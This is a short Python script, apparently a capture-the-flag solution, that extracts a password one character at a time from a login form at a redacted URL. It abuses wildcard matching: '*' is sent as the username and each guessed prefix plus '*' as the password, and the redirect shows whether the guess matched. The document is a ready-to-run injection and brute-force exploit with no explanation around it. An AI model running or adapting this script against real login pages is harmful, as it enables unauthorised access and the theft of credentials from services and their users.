import string
import requests
url = 'http://**URL**/login'

headers = {"UserAgent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}
counter = 0
flag = ''
list = string.ascii_letters
list += ''.join(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9',  '`', '~', '!', '@', '$', '%', '&', '-', '_', "'"])


while True:
    
    if counter == len(list):
        print('the flag is:'+flag)
        break
    password = flag + list[counter] + '*'
    print('Trying:'+password)
    data = {'username':'*', 'password':password}
    response = requests.post(url, headers=headers, data=data)

    if (response.url != url + "?message=Authentication%20failed"):
        flag += list[counter]
        counter = 0
    else:
        counter += 1
    

